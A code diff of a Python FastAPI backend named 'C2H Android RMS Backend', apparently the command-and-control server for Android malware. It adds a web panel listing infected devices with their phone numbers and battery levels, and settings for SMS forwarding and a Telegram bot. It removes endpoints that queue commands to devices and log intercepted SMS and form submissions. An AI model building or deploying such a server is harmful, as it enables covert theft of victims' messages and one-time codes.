@@ -1,6 +1,6 @@
 import uvicorn
 from fastapi import FastAPI, HTTPException, Request
-from fastapi.responses import HTMLResponse, JSONResponse
+from fastapi.responses import HTMLResponse
 from pydantic import BaseModel
 from typing import List, Optional, Dict, Any
 from datetime import datetime, timedelta, timezone
@@ -37,8 +37,7 @@ def init_db():
             created_at DATETIME NOT NULL
         );
     """)
-    cursor.execute("CREATE INDEX IF NOT EXISTS idx_device_id ON devices (device_id);")
-
+    
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS commands (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -127,22 +126,244 @@ class SmsLogRequest(BaseModel):
     message_body: str
 
 # --- FastAPI Application ---
-app = FastAPI(
-    title="C2H Android RMS Backend",
-    description="Complete Web Panel for Device Control",
-    version="3.0.0"
-)
+app = FastAPI(title="C2H Android RMS Backend")
 
 # --- API Endpoints ---
+@app.get("/", response_class=HTMLResponse)
+async def get_panel():
+    """मुख्य पैनल पेज - सीधा HTML return कर रहा है"""
+    return HTMLResponse(content="""
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📱 Device Control Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: white;
+            margin-bottom: 30px;
+            font-size: 2.5em;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+        }
+        .config-section {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+        .config-card {
+            background: white;
+            padding: 25px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .config-card h3 {
+            color: #333;
+            margin-bottom: 15px;
+        }
+        .config-card input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+        }
+        .config-card button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+        h2 {
+            color: white;
+            margin: 30px 0 20px;
+        }
+        .device-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+        }
+        .device-card {
+            background: white;
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            cursor: pointer;
+            border-left: 5px solid #4caf50;
+        }
+        .device-card.offline {
+            border-left-color: #f44336;
+        }
+        .status {
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.85em;
+            font-weight: bold;
+        }
+        .online .status { background: #4caf50; color: white; }
+        .offline .status { background: #f44336; color: white; }
+        .battery {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 15px 0;
+        }
+        .battery-bar {
+            flex: 1;
+            height: 10px;
+            background: #e0e0e0;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        .battery-level {
+            height: 100%;
+            background: #4caf50;
+            border-radius: 5px;
+        }
+        .no-devices {
+            grid-column: 1 / -1;
+            text-align: center;
+            padding: 50px;
+            background: white;
+            border-radius: 20px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📱 Device Control Panel</h1>
+        
+        <div class="config-section">
+            <div class="config-card">
+                <h3>📨 SMS Forward Number</h3>
+                <input type="text" id="smsNumber" placeholder="Enter phone number">
+                <button onclick="updateSMSNumber()">Update</button>
+            </div>
+            <div class="config-card">
+                <h3>🤖 Telegram Config</h3>
+                <input type="text" id="botToken" placeholder="Bot Token">
+                <input type="text" id="chatId" placeholder="Chat ID">
+                <button onclick="updateTelegram()">Update</button>
+            </div>
+        </div>
+        
+        <h2>📱 Registered Devices <span id="deviceCount">(0)</span></h2>
+        <div id="deviceGrid" class="device-grid">
+            <div class="no-devices">
+                <h3>No devices registered yet</h3>
+                <p>Install the APK on a device to see it here</p>
+            </div>
+        </div>
+    </div>
 
-@app.get("/")
-async def root():
-    """Root endpoint - redirects to panel"""
-    return HTMLResponse(content=open(__file__).read().split('HTML_CONTENT_START')[1].split('HTML_CONTENT_END')[0] if 'HTML_CONTENT_START' in open(__file__).read() else '<h1>Panel</h1>')
+    <script>
+        async function loadDevices() {
+            try {
+                const res = await fetch('/api/devices');
+                const devices = await res.json();
+                document.getElementById('deviceCount').textContent = `(${devices.length})`;
+                
+                let html = '';
+                devices.forEach(device => {
+                    const statusClass = device.is_online ? 'online' : 'offline';
+                    html += `
+                        <div class="device-card ${statusClass}">
+                            <div style="display:flex;justify-content:space-between">
+                                <span class="device-name">${device.device_name || 'Unknown'}</span>
+                                <span class="status">${device.is_online ? 'ONLINE' : 'OFFLINE'}</span>
+                            </div>
+                            <div class="battery">
+                                <span>🔋</span>
+                                <div class="battery-bar">
+                                    <div class="battery-level" style="width: ${device.battery_level}%;"></div>
+                                </div>
+                                <span>${device.battery_level}%</span>
+                            </div>
+                            <div>📱 ${device.os_version || 'Android'}</div>
+                            <div>📞 ${device.phone_number || 'No number'}</div>
+                            <div style="font-size:0.85em;color:#999;margin-top:10px">
+                                Last seen: ${device.last_seen || 'Never'}
+                            </div>
+                        </div>
+                    `;
+                });
+                document.getElementById('deviceGrid').innerHTML = html || '<div class="no-devices">No devices yet</div>';
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        async function updateSMSNumber() {
+            const number = document.getElementById('smsNumber').value;
+            if (!number) return alert('Please enter a number');
+            
+            const res = await fetch('/api/config/sms_forward', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({forward_number: number})
+            });
+            if (res.ok) alert('✅ Updated successfully!');
+        }
+
+        async function updateTelegram() {
+            const data = {
+                telegram_bot_token: document.getElementById('botToken').value,
+                telegram_chat_id: document.getElementById('chatId').value
+            };
+            
+            const res = await fetch('/api/config/telegram', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            });
+            if (res.ok) alert('✅ Updated successfully!');
+        }
+
+        async function loadConfig() {
+            try {
+                const smsRes = await fetch('/api/config/sms_forward');
+                const smsData = await smsRes.json();
+                document.getElementById('smsNumber').value = smsData.forward_number || '';
+                
+                const telRes = await fetch('/api/config/telegram');
+                const telData = await telRes.json();
+                document.getElementById('botToken').value = telData.telegram_bot_token || '';
+                document.getElementById('chatId').value = telData.telegram_chat_id || '';
+            } catch (error) {
+                console.error('Error loading config:', error);
+            }
+        }
+
+        loadDevices();
+        loadConfig();
+        setInterval(loadDevices, 5000);
+    </script>
+</body>
+</html>
+    """)
 
 @app.post("/api/device/register")
 async def register_device(data: DeviceRegisterRequest):
-    """डिवाइस रजिस्टर करें"""
     conn = get_db_connection()
     cursor = conn.cursor()
     current_time_str = now_utc_string()
@@ -153,36 +374,21 @@ async def register_device(data: DeviceRegisterRequest):
     
     if device:
         cursor.execute(
-            """
-            UPDATE devices 
-            SET device_name = ?, os_version = ?, phone_number = ?, battery_level = ?, last_seen = ?
-            WHERE device_id = ?
-            """,
-            (
-                data.device_name, data.os_version, data.phone_number, 
-                data.battery_level, current_time_str, clean_device_id
-            )
+            "UPDATE devices SET device_name=?, os_version=?, phone_number=?, battery_level=?, last_seen=? WHERE device_id=?",
+            (data.device_name, data.os_version, data.phone_number, data.battery_level, current_time_str, clean_device_id)
         )
     else:
         cursor.execute(
-            """
-            INSERT INTO devices 
-            (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) 
-            VALUES (?, ?, ?, ?, ?, ?, ?)
-            """,
-            (
-                clean_device_id, data.device_name, data.os_version, 
-                data.phone_number, data.battery_level, current_time_str, current_time_str
-            )
+            "INSERT INTO devices (device_id, device_name, os_version, phone_number, battery_level, last_seen, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
+            (clean_device_id, data.device_name, data.os_version, data.phone_number, data.battery_level, current_time_str, current_time_str)
         )
         
     conn.commit()
     conn.close()
-    return {"status": "success", "message": "Device data updated successfully."}
+    return {"status": "success"}
 
 @app.get("/api/devices", response_model=List[DeviceResponse])
 async def get_devices():
-    """सभी डिवाइस की लिस्ट लें"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("SELECT * FROM devices ORDER BY last_seen DESC")
@@ -192,12 +398,12 @@ async def get_devices():
     for device in devices:
         try:
             last_seen_dt = datetime.strptime(device['last_seen'], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
-        except (ValueError, TypeError):
+        except:
             last_seen_dt = current_time_utc - timedelta(days=1)
         is_online = (current_time_utc - last_seen_dt).total_seconds() < ONLINE_THRESHOLD_SECONDS
         response_list.append(DeviceResponse(
             device_id=device['device_id'],
-            device_name=device['device_name'] or "Unknown Device",
+            device_name=device['device_name'] or "Unknown",
             os_version=device['os_version'] or "Unknown",
             phone_number=device['phone_number'] or "No Number",
             battery_level=device['battery_level'] or 0,
@@ -210,47 +416,37 @@ async def get_devices():
 
 @app.post("/api/config/sms_forward")
 async def update_sms_forward_config(data: SmsForwardConfigRequest):
-    """SMS फॉरवर्ड नंबर अपडेट करें"""
     conn = get_db_connection()
     cursor = conn.cursor()
-    cursor.execute(
-        "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
-        ('sms_forward_number', data.forward_number)
-    )
+    cursor.execute("INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
+                  ('sms_forward_number', data.forward_number))
     conn.commit()
     conn.close()
-    return {"status": "success", "message": "Forwarding number updated."}
+    return {"status": "success"}
 
 @app.post("/api/config/telegram")
 async def update_telegram_config(data: TelegramConfigRequest):
-    """टेलीग्राम कॉन्फिग अपडेट करें"""
     conn = get_db_connection()
     cursor = conn.cursor()
-    cursor.execute(
-        "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
-        ('telegram_bot_token', data.telegram_bot_token)
-    )
-    cursor.execute(
-        "INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
-        ('telegram_chat_id', data.telegram_chat_id)
-    )
+    cursor.execute("INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
+                  ('telegram_bot_token', data.telegram_bot_token))
+    cursor.execute("INSERT OR REPLACE INTO global_settings (setting_key, setting_value) VALUES (?, ?)",
+                  ('telegram_chat_id', data.telegram_chat_id))
     conn.commit()
     conn.close()
-    return {"status": "success", "message": "Telegram config updated."}
+    return {"status": "success"}
 
 @app.get("/api/config/sms_forward")
 async def get_sms_forward_config():
-    """SMS फॉरवर्ड नंबर लें"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("SELECT setting_value FROM global_settings WHERE setting_key = ?", ('sms_forward_number',))
     result = cursor.fetchone()
     conn.close()
-    return {"forward_number": result['setting_value'] if result else "9923255555"}
+    return {"forward_number": result['setting_value'] if result else ""}
 
 @app.get("/api/config/telegram")
 async def get_telegram_config():
-    """टेलीग्राम कॉन्फिग लें"""
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute("SELECT setting_key, setting_value FROM global_settings WHERE setting_key IN ('telegram_bot_token', 'telegram_chat_id')")
@@ -261,142 +457,6 @@ async def get_telegram_config():
         "telegram_chat_id": results.get('telegram_chat_id', '')
     }
 
-@app.post("/api/command/send")
-async def send_command(data: SendCommandRequest):
-    """डिवाइस को कमांड भेजें"""
-    conn = get_db_connection()
-    cursor = conn.cursor()
-    cursor.execute(
-        "INSERT INTO commands (device_id, command_type, command_data, created_at) VALUES (?, ?, ?, ?)",
-        (data.device_id.strip(), data.command_type, json.dumps(data.command_data), now_utc_string())
-    )
-    conn.commit()
-    conn.close()
-    return {"status": "success", "message": "Command sent."}
-
-@app.get("/api/device/{device_id}/commands")
-async def get_pending_commands(device_id: str):
-    """डिवाइस के पेंडिंग कमांड लें"""
-    conn = get_db_connection()
-    cursor = conn.cursor()
-    cursor.execute(
-        "SELECT id, command_type, command_data FROM commands WHERE device_id = ? AND status = 'pending'",
-        (device_id.strip(),)
-    )
-    commands = cursor.fetchall()
-    command_list = [{"id": cmd['id'], "command_type": cmd['command_type'], "command_data": json.loads(cmd['command_data'])} for cmd in commands]
-    if command_list:
-        command_ids = [cmd['id'] for cmd in command_list]
-        placeholders = ','.join('?' * len(command_ids))
-        cursor.execute(f"UPDATE commands SET status = 'sent' WHERE id IN ({placeholders})", command_ids)
-        conn.commit()
-    conn.close()
-    return command_list
-
-@app.post("/api/command/{command_id}/execute")
-async def mark_command_executed(command_id: int):
-    """कमांड को एक्जीक्यूटेड मार्क करें"""
-    conn = get_db_connection()
-    cursor = conn.cursor()
-    cursor.execute("UPDATE commands SET status = 'executed' WHERE id = ?", (command_id,))
-    conn.commit()
-    conn.close()
-    return {"status": "success", "message": f"Command {command_id} executed."}
-
-@app.post("/api/device/{device_id}/forms")
-async def submit_form(device_id: str, data: FormSubmissionRequest):
-    """फॉर्म डेटा सेव करें"""
-    conn = get_db_connection()
-    cursor = conn.cursor()
-    cursor.execute(
-        "INSERT INTO form_submissions (device_id, custom_data, submitted_at) VALUES (?, ?, ?)",
-        (device_id.strip(), data.custom_data, now_utc_string())
-    )
-    conn.commit()
-    conn.close()
-    return {"status": "success", "message": "Form data submitted."}
-
-@app.get("/api/device/{device_id}/forms")
-async def get_form_submissions(device_id: str):
-    """डिवाइस के फॉर्म डेटा लें"""
-    conn = get_db_connection()
-    cursor = conn.cursor()
-    cursor.execute("SELECT id, custom_data, submitted_at FROM form_submissions WHERE device_id = ? ORDER BY submitted_at DESC", (device_id.strip(),))
-    forms = cursor.fetchall()
-    conn.close()
-    return [{"id": form['id'], "custom_data": form['custom_data'], "submitted_at": form['submitted_at']} for form in forms]
-
-@app.post("/api/device/{device_id}/sms")
-async def log_sms(device_id: str, data: SmsLogRequest):
-    """SMS लॉग करें"""
-    conn = get_db_connection()
-    cursor = conn.cursor()
-    cursor.execute(
-        "INSERT INTO sms_logs (device_id, sender, message_body, received_at) VALUES (?, ?, ?, ?)",
-        (device_id.strip(), data.sender, data.message_body, now_utc_string())
-    )
-    conn.commit()
-    conn.close()
-    return {"status": "success", "message": "SMS logged."}
-
-@app.get("/api/device/{device_id}/sms")
-async def get_sms_logs(device_id: str):
-    """डिवाइस के SMS लॉग लें"""
-    conn = get_db_connection()
-    cursor = conn.cursor()
-    cursor.execute("SELECT id, sender, message_body, received_at FROM sms_logs WHERE device_id = ? ORDER BY received_at DESC LIMIT 500", (device_id.strip(),))
-    sms_logs = cursor.fetchall()
-    conn.close()
-    return [{"id": sms['id'], "sender": sms['sender'], "message_body": sms['message_body'], "received_at": sms['received_at']} for sms in sms_logs]
-
-@app.delete("/api/device/{device_id}")
-async def delete_device(device_id: str):
-    """डिवाइस डिलीट करें"""
-    conn = get_db_connection()
-    cursor = conn.cursor()
-    clean_device_id = device_id.strip()
-    cursor.execute("SELECT id FROM devices WHERE device_id = ?", (clean_device_id,))
-    device = cursor.fetchone()
-    if not device:
-        conn.close()
-        raise HTTPException(status_code=404, detail="Device not found.")
-    
-    cursor.execute("DELETE FROM devices WHERE device_id = ?", (clean_device_id,))
-    cursor.execute("DELETE FROM sms_logs WHERE device_id = ?", (clean_device_id,))
-    cursor.execute("DELETE FROM form_submissions WHERE device_id = ?", (clean_device_id,))
-    cursor.execute("DELETE FROM commands WHERE device_id = ?", (clean_device_id,))
-    conn.commit()
-    conn.close()
-    return {"status": "success", "message": "Device and all data deleted."}
-
-@app.get("/status")
-async def status_check():
-    """Status check endpoint"""
-    return HTMLResponse(content="""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>C2H RMS Status</title>
-        <style>
-            body{font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background-color:#121212;color:#fff}
-            .container{text-align:center;padding:40px;border-radius:15px;background-color:#1e1e1e;box-shadow:0 10px 25px rgba(0,0,0,0.5)}
-            h1{color:#00bfff;margin-bottom:10px}
-            p{color:#b0b0b0}
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <h1>✅ C2H RMS Backend is Running</h1>
-            <p>The server is deployed and fully operational.</p>
-            <p>API Documentation available at <a href="/docs" style="color:#7b1fa2">/docs</a>.</p>
-        </div>
-    </body>
-    </html>
-    """)
-
-# HTML_CONTENT_START
-# HTML_CONTENT_END
-
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8000))
-    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=False)
+    uvicorn.run("main:app", host="0.0.0.0", port=port)
